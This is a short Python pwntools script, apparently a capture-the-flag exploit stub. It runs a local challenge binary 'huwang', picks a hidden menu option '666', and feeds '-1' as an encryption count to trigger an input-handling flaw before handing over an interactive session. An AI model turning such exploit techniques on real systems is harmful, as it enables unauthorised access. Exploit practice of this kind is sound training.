from pwn import *

p = process('./huwang')

p.recvuntil('command>> \n')
p.sendline('666')
p.sendafter('please input your name','A')
p.sendlineafter('Do you want to guess the secret?\n','y')
p.sendlineafter('encrypt the secret:\n','-1')

p.interactive()
